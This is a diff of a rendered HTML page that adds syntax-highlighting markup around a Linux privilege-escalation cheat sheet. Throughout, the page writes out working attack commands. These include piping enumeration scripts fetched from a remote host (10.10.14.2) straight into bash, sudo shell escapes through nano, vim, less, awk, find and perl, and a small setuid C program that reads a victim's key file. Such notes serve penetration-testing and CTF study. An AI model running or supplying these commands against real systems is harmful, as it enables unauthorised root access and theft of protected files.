@@ -272,25 +272,25 @@
 <p>On the target&rsquo;s machine we can do:</p>
 </li>
 </ul>
-<pre><code>$ curl 10.10.14.2/linpeas.sh | bash
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl 10.10.14.2/linpeas.sh | bash
 $ curl 10.10.14.2/LinEnum.sh | bash
-</code></pre><hr>
+</code></pre></div><hr>
 <h2 id="nano-privilege-escalation">Nano privilege escalation</h2>
 <ul>
 <li>This can be used to gain root access on the server.</li>
 </ul>
-<pre><code>sudo -u root /bin/nano /opt/priv
-</code></pre><ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u root /bin/nano /opt/priv
+</code></pre></div><ul>
 <li>Nano allows inserting external files into the current one using the shortcut.</li>
 </ul>
-<pre><code>Ctrl+R
-</code></pre><p>/pics/nano-001.png</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Ctrl+R
+</code></pre></div><p>/pics/nano-001.png</p>
 <ul>
 <li>The command reveals that we can execute system commands using <strong>^X (Press Ctrl + X)</strong> and enter the following command to spawn a shell.</li>
 </ul>
-<pre><code>Press Ctrl + X
-reset; sh 1&gt;&amp;0 2&gt;&amp;0
-</code></pre><p>/pics/nano-002.png</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Press Ctrl + X
+reset; sh 1&gt;&amp;<span style="color:#ae81ff">0</span> 2&gt;&amp;<span style="color:#ae81ff">0</span>
+</code></pre></div><p>/pics/nano-002.png</p>
 <ul>
 <li>Now we have a root shell.
 /pics/nano-003.png</li>
@@ -298,17 +298,17 @@ reset; sh 1&gt;&amp;0 2&gt;&amp;0
 <hr>
 <h2 id="sudo-privilege-escalation">Sudo privilege escalation</h2>
 <h3 id="listing-allowed-sudo-commands">Listing allowed <code>sudo</code> commands</h3>
-<pre><code>$ sudo -l
-</code></pre><h3 id="impersonating-with-sudo">Impersonating with <code>sudo</code></h3>
-<pre><code>$ sudo -u victim command
-</code></pre><h3 id="escalating-privileges-with-find-command">Escalating privileges with <code>find</code> command</h3>
-<pre><code>$ sudo -u victim /usr/bin/find -exec /bin/bash \;
-</code></pre><h3 id="escalating-privileges-with-vim-editor">Escalating privileges with <code>vim</code> editor</h3>
-<pre><code>$ sudo -u victim /usr/bin/vim
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -l
+</code></pre></div><h3 id="impersonating-with-sudo">Impersonating with <code>sudo</code></h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim command
+</code></pre></div><h3 id="escalating-privileges-with-find-command">Escalating privileges with <code>find</code> command</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim /usr/bin/find -exec /bin/bash <span style="color:#ae81ff">\;</span>
+</code></pre></div><h3 id="escalating-privileges-with-vim-editor">Escalating privileges with <code>vim</code> editor</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim /usr/bin/vim
 
-# Inside the vim we can call a shell
+<span style="color:#75715e"># Inside the vim we can call a shell</span>
 :!/bin/bash
-</code></pre><h3 id="escalating-privileges-with--less-command">Escalating privileges with  <code>less</code> command</h3>
+</code></pre></div><h3 id="escalating-privileges-with--less-command">Escalating privileges with  <code>less</code> command</h3>
 <ul>
 <li>Open a file using less</li>
 </ul>
@@ -316,37 +316,37 @@ reset; sh 1&gt;&amp;0 2&gt;&amp;0
 </code></pre><ul>
 <li>Inside the less we can call a shell</li>
 </ul>
-<pre><code>!/bin/bash
-</code></pre><h3 id="escalating-privileges-with-awk-command">Escalating privileges with <code>awk</code> command</h3>
-<pre><code># Reading files with awk
-$ sudo -u victim /usr/bin/awk '{print $1}' /home/victim/key.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">!/bin/bash
+</code></pre></div><h3 id="escalating-privileges-with-awk-command">Escalating privileges with <code>awk</code> command</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Reading files with awk</span>
+$ sudo -u victim /usr/bin/awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> /home/victim/key.txt
 
-# Executing command within awk
-$ sudo -u victim /usr/bin/awk 'BEGIN {system(&quot;/bin/bash&quot;)}'
-</code></pre><h3 id="escalating-privileges-with-chmod">Escalating privileges with <code>chmod</code></h3>
+<span style="color:#75715e"># Executing command within awk</span>
+$ sudo -u victim /usr/bin/awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;</span>
+</code></pre></div><h3 id="escalating-privileges-with-chmod">Escalating privileges with <code>chmod</code></h3>
 <ul>
 <li>Create the exploit to call a command</li>
 </ul>
-<pre><code>#include&lt;stdio.h&gt;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include&lt;stdio.h&gt;</span>
 
-int main(void)
-{
-    system(&quot;cat /home/victim/key.txt&quot;);
-}
-</code></pre><ul>
+int main<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>
+<span style="color:#f92672">{</span>
+    system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cat /home/victim/key.txt&#34;</span><span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span>
+</code></pre></div><ul>
 <li>Compiling the exploit</li>
 </ul>
-<pre><code>$ cd /tmp
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cd /tmp
 $ gcc exploit.c -o exploit
-</code></pre><ul>
+</code></pre></div><ul>
 <li>Setting the <strong>setuid</strong> and <strong>setgid</strong> flags</li>
 </ul>
-<pre><code>$ sudo -u victim cp exploit exploit2
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim cp exploit exploit2
 $ sudo -u victim chmod +xs exploit2
 $ ./exploit2
-</code></pre><h3 id="escalating-privileges-with-perl">Escalating privileges with <code>perl</code></h3>
-<pre><code>$ sudo -u victim perl -e 'exec &quot;/bin/bash&quot;;'
-</code></pre>
+</code></pre></div><h3 id="escalating-privileges-with-perl">Escalating privileges with <code>perl</code></h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -u victim perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
+</code></pre></div>
   </div>
   
 
